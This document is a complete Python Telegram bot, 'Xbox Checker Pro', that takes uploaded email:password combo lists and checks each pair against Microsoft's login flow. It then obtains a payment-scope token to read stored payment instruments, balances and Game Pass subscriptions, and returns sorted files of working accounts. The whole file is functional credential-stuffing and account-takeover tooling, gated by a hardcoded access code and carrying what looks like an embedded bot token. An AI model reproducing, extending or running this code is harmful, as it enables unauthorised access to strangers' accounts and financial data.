#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TELEGRAM XBOX ACCOUNT CHECKER BOT
Powered by Xbox Checker Pro v4.0
"""

import re
import uuid
import time
import os
import json
import asyncio
import tempfile
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ============================================================================
# CONFIGURATION
# ============================================================================

BOT_TOKEN = "8798041661:AAHUgRM2Aq4jYO_5J9fYWJHJelnXwQ_KODo"  # @BotFather থেকে নিন
FIXED_REDEEM_CODE = "XBOX2024EVIL"  # আপনার ফিক্সড রিডিম কোড

# ============================================================================
# XBOX CHECKER CORE
# ============================================================================

class XboxChecker:
    def __init__(self):
        pass
        
    def get_session(self):
        return requests.Session()
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"
    
    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())
            
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "debug": {"step": 1, "response": r1.text[:200]}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "debug": {"step": 1, "response": r1.text[:200]}}
            
            time.sleep(0.5)
            
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD", "debug": {"step": 2, "response": r2.text[:200]}}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "debug": {"step": 3, "response": r3.text[:200]}}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "debug": {"step": 3, "response": "No location"}}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "debug": {"step": 3, "response": "No code"}}
            
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "debug": {"step": 3, "response": "No MSPCID"}}
            
            cid = mspcid.upper()
            
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, 
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD", "debug": {"step": 4, "response": r4.text[:200]}}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            
            country = ""
            name = ""
            
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass
            
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            payment_data = {"country": country, "name": name}
            
            correlation_id2 = str(uuid.uuid4())
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
            except:
                pass
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r8.status_code == 200:
                    response_text = r8.text
                    
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                        'Xbox Game Pass Core': 'GAME PASS CORE',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'EA Play': 'EA PLAY',
                        'Microsoft 365 Family': 'M365 FAMILY',
                        'Microsoft 365 Personal': 'M365 PERSONAL',
                    }
                    
                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', response_text)
                    
                    if not renewal_match:
                        return {"status": "FREE", "data": payment_data}
                    
                    renewal_date = renewal_match.group(1)
                    days_remaining = self.get_remaining_days(renewal_date)
                    
                    if days_remaining == "EXPIRED":
                        return {"status": "EXPIRED", "data": {**payment_data, "renewal_date": renewal_date}}
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword.lower() in response_text.lower():
                            return {"status": "PREMIUM", "data": {**payment_data, "premium_type": type_name, "renewal_date": renewal_date, "days_remaining": days_remaining}}
                    
                    return {"status": "FREE", "data": {**payment_data, "renewal_date": renewal_date, "days_remaining": days_remaining}}
            except:
                pass
            
            return {"status": "FREE", "data": payment_data}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            return {"status": "ERROR", "error": str(e)[:100]}

# ============================================================================
# TELEGRAM BOT CLASS
# ============================================================================

class XboxBot:
    def __init__(self):
        self.user_sessions = {}  # {user_id: {'verified': bool, 'checking': bool, 'results': dict}}
        self.checker = XboxChecker()
    
    def get_keyboard(self):
        """Main menu keyboard"""
        keyboard = [
            [InlineKeyboardButton("🎮 Xbox Checker", callback_data="xbox_checker")],
            [InlineKeyboardButton("🚪 Exit Admin Panel", callback_data="exit_panel")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user_id = update.effective_user.id
        
        # Reset session
        self.user_sessions[user_id] = {
            'verified': False,
            'checking': False,
            'results': {'premium': [], 'free': [], 'invalid': []},
            'total_accounts': 0,
            'checked': 0
        }
        
        await update.message.reply_text(
            "🎮 **XBOX ACCOUNT CHECKER BOT** 🎮\n\n"
            "Welcome to Ultimate Xbox Checker Bot!\n\n"
            "🔐 **Please enter the redeem code to continue:**",
            parse_mode="Markdown"
        )
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages (redeem code or file)"""
        user_id = update.effective_user.id
        text = update.message.text.strip()
        
        # Initialize session if not exists
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {
                'verified': False,
                'checking': False,
                'results': {'premium': [], 'free': [], 'invalid': []},
                'total_accounts': 0,
                'checked': 0
            }
        
        session = self.user_sessions[user_id]
        
        # Check for redeem code
        if not session['verified']:
            await self.verify_redeem_code(update, context, text)
        else:
            # Already verified, can handle file or commands
            await update.message.reply_text(
                "✅ You are verified!\n\n"
                "Use the buttons below to continue:",
                reply_markup=self.get_keyboard()
            )
    
    async def verify_redeem_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
        """Verify the redeem code"""
        user_id = update.effective_user.id
        
        # Send checking message
        msg = await update.message.reply_text(
            "🔍 **Verifying redeem code...**\n"
            "Please wait 2-10 seconds...",
            parse_mode="Markdown"
        )
        
        # Simulate checking time (2-10 seconds)
        await asyncio.sleep(3)
        
        if code == FIXED_REDEEM_CODE:
            self.user_sessions[user_id]['verified'] = True
            await msg.edit_text(
                "✅ **CODE VALID!** ✅\n\n"
                "Your access has been granted.\n"
                "Welcome to Xbox Checker Pro!",
                parse_mode="Markdown"
            )
            await asyncio.sleep(1)
            await update.message.reply_text(
                "🎮 **Main Menu** 🎮\n\n"
                "Please select an option:",
                reply_markup=self.get_keyboard()
            )
        else:
            await msg.edit_text(
                "❌ **INVALID CODE!** ❌\n\n"
                "Please enter the correct redeem code to continue.",
                parse_mode="Markdown"
            )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        data = query.data
        
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {'verified': False, 'checking': False, 'results': {'premium': [], 'free': [], 'invalid': []}}
        
        if data == "xbox_checker":
            await query.edit_message_text(
                "🎮 **XBOX ACCOUNT CHECKER** 🎮\n\n"
                "📁 Please send me your combo list file.\n\n"
                "**Format:** `email:password` (one per line)\n\n"
                "Send as **TXT file** or paste directly.",
                parse_mode="Markdown"
            )
            # Set waiting for file
            context.user_data['waiting_for_file'] = True
            
        elif data == "exit_panel":
            await query.edit_message_text(
                "🚪 **Exited Admin Panel** 🚪\n\n"
                "Type /start to access again.",
                parse_mode="Markdown"
            )
            if user_id in self.user_sessions:
                self.user_sessions[user_id]['verified'] = False
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle uploaded TXT file"""
        user_id = update.effective_user.id
        
        if user_id not in self.user_sessions or not self.user_sessions[user_id].get('verified'):
            await update.message.reply_text("❌ Please verify first with /start")
            return
        
        if not context.user_data.get('waiting_for_file'):
            await update.message.reply_text("Please click 'Xbox Checker' button first.")
            return
        
        document = update.message.document
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file")
            return
        
        # Download file
        status_msg = await update.message.reply_text("📥 Downloading file...")
        
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Parse combos
        combos = []
        for line in content.split('\n'):
            line = line.strip()
            if line and ':' in line:
                combos.append(line)
        
        if not combos:
            await status_msg.edit_text("❌ No valid combos found in file.")
            return
        
        context.user_data['waiting_for_file'] = False
        
        # Start checking
        await status_msg.edit_text(f"✅ Loaded {len(combos)} accounts!\n\n🚀 Starting checker...")
        
        await self.check_accounts(update, context, combos)
    
    async def check_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE, combos: list):
        """Main checking function with live status"""
        user_id = update.effective_user.id
        session = self.user_sessions[user_id]
        
        session['total_accounts'] = len(combos)
        session['checked'] = 0
        session['results'] = {'premium': [], 'free': [], 'invalid': []}
        
        # Live status message
        status_msg = await update.message.reply_text(
            self.get_status_text(session),
            parse_mode="Markdown"
        )
        
        # Check each account
        for i, combo in enumerate(combos):
            if not session.get('verified', True):
                break
            
            try:
                email, password = combo.split(':', 1)
                result = self.checker.check(email, password)
                
                session['checked'] += 1
                
                # Format result for display
                if result['status'] == 'PREMIUM':
                    data = result.get('data', {})
                    display = f"🎮 {email} | PREMIUM | {data.get('premium_type', 'UNKNOWN')} | {data.get('days_remaining', '0')} days"
                    session['results']['premium'].append(f"{email}:{password} | {data.get('premium_type', 'UNKNOWN')} | {data.get('days_remaining', '0')} days | {data.get('country', 'N/A')}")
                    
                elif result['status'] == 'FREE':
                    data = result.get('data', {})
                    display = f"📦 {email} | FREE | Country: {data.get('country', 'N/A')}"
                    session['results']['free'].append(f"{email}:{password} | Country: {data.get('country', 'N/A')}")
                    
                elif result['status'] == 'EXPIRED':
                    display = f"⏰ {email} | EXPIRED"
                    session['results']['invalid'].append(f"{email}:{password} | EXPIRED")
                    
                elif result['status'] == '2FA':
                    display = f"🔐 {email} | 2FA REQUIRED"
                    session['results']['invalid'].append(f"{email}:{password} | 2FA")
                    
                elif result['status'] == 'BANNED':
                    display = f"🚫 {email} | BANNED"
                    session['results']['invalid'].append(f"{email}:{password} | BANNED")
                    
                else:
                    display = f"❌ {email} | INVALID"
                    session['results']['invalid'].append(f"{email}:{password} | INVALID")
                
                # Update live status every 5 accounts
                if (i + 1) % 5 == 0 or (i + 1) == len(combos):
                    await status_msg.edit_text(
                        self.get_status_text(session),
                        parse_mode="Markdown"
                    )
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.5)
                
            except Exception as e:
                display = f"⚠️ Error: {str(e)[:50]}"
                session['results']['invalid'].append(f"ERROR: {combo}")
                session['checked'] += 1
        
        # Send result files
        await self.send_results(update, context, session)
    
    def get_status_text(self, session):
        """Generate live status text"""
        total = session['total_accounts']
        checked = session['checked']
        premium = len(session['results']['premium'])
        free = len(session['results']['free'])
        invalid = len(session['results']['invalid'])
        
        percent = int((checked / total) * 100) if total > 0 else 0
        
        # Progress bar
        bar_length = 20
        filled = int((percent / 100) * bar_length)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        return f"""🎮 **XBOX CHECKER - LIVE STATUS** 🎮

{bar} `{percent}%`

📊 **Progress:** {checked}/{total} accounts
✅ **Premium:** {premium}
📦 **Free:** {free}
❌ **Invalid:** {invalid}
⏱️ **Remaining:** ~{max(0, total - checked)} accounts

*Please wait while checking continues...*"""
    
    async def send_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE, session):
        """Send result files to user"""
        user_id = update.effective_user.id
        
        premium_count = len(session['results']['premium'])
        free_count = len(session['results']['free'])
        invalid_count = len(session['results']['invalid'])
        
        summary = f"""✅ **CHECKING COMPLETED!** ✅

🎮 **Premium Accounts:** {premium_count}
📦 **Free Accounts:** {free_count}
❌ **Invalid/Bad:** {invalid_count}
📊 **Total Checked:** {session['total_accounts']}

Sending result files..."""

        await update.message.reply_text(summary, parse_mode="Markdown")
        
        # Send files
        temp_dir = tempfile.gettempdir()
        
        # Premium file
        if premium_count > 0:
            premium_file = os.path.join(temp_dir, f"premium_{user_id}.txt")
            with open(premium_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(session['results']['premium']))
            with open(premium_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=f,
                    filename=f"premium_accounts_{premium_count}.txt",
                    caption=f"🎮 Premium Accounts: {premium_count}"
                )
            os.remove(premium_file)
        
        # Free file
        if free_count > 0:
            free_file = os.path.join(temp_dir, f"free_{user_id}.txt")
            with open(free_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(session['results']['free']))
            with open(free_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=f,
                    filename=f"free_accounts_{free_count}.txt",
                    caption=f"📦 Free Accounts: {free_count}"
                )
            os.remove(free_file)
        
        # Invalid file
        if invalid_count > 0:
            invalid_file = os.path.join(temp_dir, f"invalid_{user_id}.txt")
            with open(invalid_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(session['results']['invalid']))
            with open(invalid_file, 'rb') as f:
                await context.bot.send_document(
                    chat_id=user_id,
                    document=f,
                    filename=f"invalid_accounts_{invalid_count}.txt",
                    caption=f"❌ Invalid/Bad Accounts: {invalid_count}"
                )
            os.remove(invalid_file)
        
        await update.message.reply_text(
            "🎮 **Thank you for using Xbox Checker Bot!** 🎮\n\n"
            "Type /start to check more accounts.",
            reply_markup=self.get_keyboard()
        )

# ============================================================================
# MAIN
# ============================================================================

async def main():
    # Create bot instance
    bot = XboxBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    application.add_handler(MessageHandler(filters.Document.TXT, bot.handle_document))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    
    # Start bot
    print("🤖 Telegram Xbox Checker Bot Started!")
    print(f"🔑 Redeem Code: {FIXED_REDEEM_CODE}")
    print("=" * 50)
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Install required packages if not available
    import subprocess
    import sys
    
    packages = ['python-telegram-bot', 'requests']
    for package in packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    asyncio.run(main())